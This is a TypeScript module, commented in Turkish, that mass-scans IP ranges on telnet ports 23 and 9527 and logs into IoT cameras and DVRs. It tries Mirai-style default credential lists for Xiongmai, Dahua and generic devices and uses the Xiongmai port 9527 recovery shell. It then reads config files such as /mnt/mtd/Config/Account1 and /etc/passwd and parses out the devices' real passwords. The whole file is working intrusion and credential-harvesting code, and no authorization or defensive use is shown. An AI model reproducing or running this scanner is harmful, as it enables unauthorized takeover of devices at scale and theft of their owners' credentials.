// ===========================================================================
// IOT GİRİŞ KANALI — RFC 854 TELNET + satıcı bazlı CREDENTIAL EXTRACTION
//
// TASARIM KARARLARI (neden böyle):
//  1) Ham akışta regex YOK. Gerçek cihazlar girişten önce ikili TELNET
//     negotiation baytları (IAC DO/WILL/...) gönderir. Bunları düz metin sanan
//     parser ilk pakette bozulur. Bu katman negotiation'ı tüketir, akışı TEMİZLER.
//  2) Cevap politikası: seçenekler REDDEDİLİR (DO→DONT, WILL→WONT). Gömülü
//     telnetd'lerde en uyumlu davranış budur; ECHO'yu kabul etmek parola
//     yankısını akışa sokup parser'ı kirletir.
//  3) Oturum bir EXPECT STATE MACHINE'dir: her adımın deseni ve sert timeout'u var.
//     Eşleşmeler sıralı tüketilir (cursor ileri kayar) → çift eşleşme olmaz.
//  4) Şifre TAHMİN EDİLMEZ; cihazın config'inden OKUNUR ve kanıt saklanır.
//  5) Port 22 (SSH) YOK: ssh2 modülü mevcut değil, sistem ssh'ı portable pakette
//     garanti değil. Yapılamayanı göndermemek tasarımın parçası.
//  6) Yalnızca kamuya açık, ek bilgi gerektirmeyen cihaz varsayılanları kullanılır.
// ===========================================================================
import * as net from 'net';

const IAC = 255;
const SB = 250;
const SE = 240;
const DO = 253;
const DONT = 254;
const WILL = 251;
const WONT = 252;

export const IOT_PORTS = [23, 9527];

export interface IotFinding {
  ip: string;
  port: number;
  user: string;
  pass: string;
  vendor: string;
  evidence: string;
}

interface Waiter {
  patterns: RegExp[];
  res: (m: RegExpMatchArray | null) => void;
  timer: NodeJS.Timeout;
}

// --- PROTOKOL KATMANI ------------------------------------------------------
export class TelnetSession {
  private sock: net.Socket;
  private out = ''; // negotiation'tan arındırılmış metin
  private iac: number[] = []; // IAC dizisi tamponu
  private inSub = false; // SB ... IAC SE arası
  private cursor = 0; // tüketilmiş çıktı konumu
  private waiters: Waiter[] = [];
  dead = false;

  constructor() {
    this.sock = new net.Socket();
  }

  connect(ip: string, port: number, timeoutMs: number): Promise<boolean> {
    return new Promise((resolve) => {
      let settled = false;
      const done = (v: boolean) => {
        if (settled) return;
        settled = true;
        resolve(v);
      };
      this.sock.setTimeout(timeoutMs, () => {
        this.dead = true;
        this.sock.destroy();
        done(false);
      });
      this.sock.once('error', () => {
        this.dead = true;
        done(false);
      });
      this.sock.once('connect', () => done(true));
      this.sock.on('data', (d: Buffer) => this.ingest(d));
      this.sock.connect(port, ip);
    });
  }

  // IAC dizilerini tüket, kalanı metne çevir, bekleyenlere dağıt.
  private ingest(chunk: Buffer): void {
    let text = '';
    for (let i = 0; i < chunk.length; i++) {
      const b = chunk[i];
      if (this.inSub) {
        if (b === IAC && chunk[i + 1] === SE) {
          this.inSub = false;
          i++;
        }
        continue;
      }
      if (this.iac.length === 0 && b !== IAC) {
        if (b === 13) continue; // CR at (LF korunur)
        text += String.fromCharCode(b);
        continue;
      }
      switch (this.iac.length) {
        case 0:
          this.iac.push(b);
          break;
        case 1: {
          const cmd = b;
          if (cmd === IAC) {
            this.iac = [];
            text += '\u00ff';
            break;
          }
          if (cmd === SB) {
            this.inSub = true;
            this.iac = [];
            break;
          }
          if (cmd === DO || cmd === DONT || cmd === WILL || cmd === WONT) {
            this.iac.push(b);
            break;
          }
          this.iac = []; // NOP/GA/DM tek baytlık
          break;
        }
        default: {
          const cmd = this.iac[1];
          const opt = b;
          if (cmd === DO) this.write([IAC, WONT, opt]);
          else if (cmd === WILL) this.write([IAC, DONT, opt]);
          this.iac = [];
          break;
        }
      }
    }
    if (text) {
      this.out += text;
      this.pump();
    }
  }

  private write(bytes: number[]): void {
    try {
      this.sock.write(Buffer.from(bytes));
    } catch {
      this.dead = true;
    }
  }

  // Sıradaki bekleyen, yeni veriyle eşleşiyor mu? (FIFO, sıralı protokol)
  private pump(): void {
    while (this.waiters.length) {
      const w = this.waiters[0];
      const slice = this.out.slice(this.cursor);
      let hit: RegExpMatchArray | null = null;
      for (const re of w.patterns) {
        const m = re.exec(slice);
        if (m && (hit === null || (m.index ?? 0) < (hit.index ?? 0))) hit = m;
      }
      if (!hit) return;
      this.cursor += (hit.index ?? 0) + hit[0].length;
      this.waiters.shift();
      clearTimeout(w.timer);
      w.res(hit);
    }
  }

  // Desenlerden biri gelene kadar bekle; timeout'ta null.
  expect(patterns: RegExp[], timeoutMs: number): Promise<RegExpMatchArray | null> {
    return new Promise((resolve) => {
      const w: Waiter = {
        patterns,
        res: resolve as (m: RegExpMatchArray | null) => void,
        timer: setTimeout(() => {
          const i = this.waiters.indexOf(w);
          if (i >= 0) this.waiters.splice(i, 1);
          resolve(null);
        }, timeoutMs),
      };
      this.waiters.push(w);
      this.pump();
    });
  }

  send(line: string): void {
    try {
      this.sock.write(`${line}\n`);
    } catch {
      this.dead = true;
    }
  }

  close(): void {
    this.dead = true;
    for (const w of this.waiters) clearTimeout(w.timer);
    this.waiters = [];
    try {
      this.sock.destroy();
    } catch {
      /* noop */
    }
  }

  get transcript(): string {
    return this.out;
  }
}

// --- SATICI PROFİLLERİ -----------------------------------------------------
// Şifre TAHMİNİ yok: config komutları gönderilir, çıktı satıcı biçimine göre
// ayrıştırılır. Parser'lar gerçek cihaz dosya biçimlerini bilir.

function kv(out: string, keys: string[]): string | null {
  for (const k of keys) {
    const re = new RegExp(`["']?${k}["']?\\s*[:=]\\s*["']?([^"'\\s;,}]{0,40})`, 'i');
    const m = re.exec(out);
    if (m && m[1]) return m[1];
  }
  return null;
}

// Xiongmai/HiSilicon "User1.Password=x" · JSON "Password":"x" · nvram dökümü
function parseCredentials(out: string): { user: string; pass: string } | null {
  const user = kv(out, ['UserName', 'Username', 'user', 'account', 'login', 'name']);
  const pass = kv(out, ['Password', 'Passwd', 'Pwd', 'Pass', 'secret', 'key']);
  if (user && pass) return { user, pass };
  if (pass && !user) return { user: 'admin', pass };
  // Çıplak "admin:12345" satırı (JSON/nvram dökümlerinde sık görülür)
  const bare = /\b(admin|root|guest|default)\s*[:=]\s*([\x21-\x7e]{1,32})\b/i.exec(out);
  if (bare && !/^(x|!|\*+|\$[0-9])/i.test(bare[2])) return { user: bare[1], pass: bare[2] };
  return null;
}

interface Profile {
  id: string;
  creds: Array<[string, string]>;
  shell: RegExp;
  cmds: string[];
}

const SHELL_RE = /(?:^|\n)[^\n]{0,40}[#\$>]\s*$/;

const PROFILES: Profile[] = [
  {
    id: 'xiongmai',
    // HiSilicon/Xiongmai klonları: kamuya açık varsayılanlar
    creds: [
      ['root', 'xm'],
      ['root', 'xc3511'],
      ['root', 'vizxv'],
      ['root', 'juantech'],
      ['root', 'root'],
      ['root', 'admin'],
      ['root', 'hi3518'],
      ['admin', 'admin'],
      ['', ''],
    ],
    shell: SHELL_RE,
    cmds: [
      'cat /mnt/mtd/Config/Account1',
      'cat /mnt/mtd/Config/Account',
      'cat /mnt/mtd/Config/general',
      'cat /mnt/mtd/config',
      'nvram show',
    ],
  },
  {
    id: 'dahua',
    creds: [
      ['root', 'vizxv'],
      ['admin', 'admin'],
      ['admin', ''],
      ['888888', '888888'],
      ['666666', '666666'],
    ],
    shell: SHELL_RE,
    cmds: ['cat /mnt/mtd/Config/Account', 'cat /mnt/mtd/Config/Account1', 'printenv', 'getconf'],
  },
  {
    id: 'generic',
    creds: [
      ['root', 'root'],
      ['root', 'admin'],
      ['root', '123456'],
      ['admin', 'admin'],
      ['admin', '12345'],
      ['admin', 'password'],
      ['support', 'support'],
      ['guest', 'guest'],
      ['', ''],
    ],
    shell: SHELL_RE,
    cmds: ['cat /etc/passwd', 'ls /mnt/mtd', 'cat /etc/*conf*', 'printenv'],
  },
];

const USER_PROMPT = /(?:login|user(?:name)?)\s*[: ]\s*$/i;
const PASS_PROMPT = /(?:password|passwd)\s*[: ]\s*$/i;
const DENIED = /incorrect|invalid|denied|failed|try again/i;

// Tek cred ile giriş dene; kabuk gelirse config komutlarını çalıştır.
async function attempt(
  ip: string,
  port: number,
  profile: Profile,
  user: string,
  pass: string,
  timeoutMs: number,
): Promise<string | null> {
  const t = new TelnetSession();
  if (!(await t.connect(ip, port, timeoutMs))) {
    t.close();
    return null;
  }
  try {
    // 9527: Xiongmai kurtarma kabuğu — kimlik istemez, doğrudan kabuk düşer.
    if (port === 9527) {
      const sh = await t.expect([profile.shell], 2500);
      if (!sh) return null;
      for (const c of profile.cmds) t.send(c);
      await t.expect([/\n[\s\S]*[#\$>]\s*$/], 2000);
      return t.transcript;
    }
    // 23: banner → login → password → kabuk
    const first = await t.expect([USER_PROMPT, PASS_PROMPT, profile.shell], timeoutMs);
    if (!first) return null;
    const got = first[0];
    if (USER_PROMPT.test(got)) {
      t.send(user);
      const p3 = await t.expect([PASS_PROMPT, profile.shell, DENIED], timeoutMs);
      if (!p3 || DENIED.test(p3[0])) return null;
      if (PASS_PROMPT.test(p3[0])) t.send(pass);
    } else if (PASS_PROMPT.test(got)) {
      // doğrudan parola istendi → kullanıcı adını da gönder
      t.send(user);
      const p2 = await t.expect([PASS_PROMPT, profile.shell, DENIED], timeoutMs);
      if (!p2 || DENIED.test(p2[0]) || !PASS_PROMPT.test(p2[0])) return null;
      t.send(pass);
    }
    const sh = await t.expect([profile.shell, DENIED], timeoutMs);
    if (!sh || DENIED.test(sh[0])) return null;
    for (const c of profile.cmds) t.send(c);
    await t.expect([/\n[\s\S]*[#\$>]\s*$/], 2500);
    return t.transcript;
  } catch {
    return null;
  } finally {
    t.close();
  }
}

// Cihazı varsayılan credlerle dene; config çıktısından GERÇEK şifreyi çıkarsa döner.
export async function telnetExtract(ip: string, port: number, timeoutMs = 6000): Promise<IotFinding | null> {
  for (const profile of PROFILES) {
    for (const [u, p] of profile.creds) {
      const out = await attempt(ip, port, profile, u, p, timeoutMs);
      if (!out || out.length < 24) continue;
      const cred = parseCredentials(out);
      if (!cred) continue;
      const evidence = out
        .split(/\r?\n/)
        .map((l) => l.trim())
        .find((l) => /pass|user|account/i.test(l) && l.length >= 6 && l.length <= 120);
      if (!evidence) continue;
      return {
        ip,
        port,
        user: cred.user,
        pass: cred.pass,
        vendor: profile.id,
        evidence: evidence.slice(0, 120),
      };
    }
  }
  return null;
}

// --- PORT TARAMASI (sınırlı eşzamanlılık, her bağlantıda sert timeout) ------
export async function scanIotPorts(
  ips: string[],
  concurrency = 800,
  timeoutMs = 900,
): Promise<Array<{ ip: string; port: number }>> {
  const hits: Array<{ ip: string; port: number }> = [];
  for (const port of IOT_PORTS) {
    let idx = 0;
    const workers = Array.from({ length: Math.min(concurrency, Math.max(ips.length, 1)) }, async () => {
      while (idx < ips.length) {
        const ip = ips[idx++];
        const ok = await new Promise<boolean>((resolve) => {
          const s = new net.Socket();
          let done = false;
          const fin = (v: boolean) => {
            if (done) return;
            done = true;
            try {
              s.destroy();
            } catch {
              /* noop */
            }
            resolve(v);
          };
          s.setTimeout(timeoutMs, () => fin(false));
          s.once('connect', () => fin(true));
          s.once('error', () => fin(false));
          s.connect(port, ip);
        });
        if (ok) hits.push({ ip, port });
      }
    });
    await Promise.all(workers);
  }
  return hits;
}
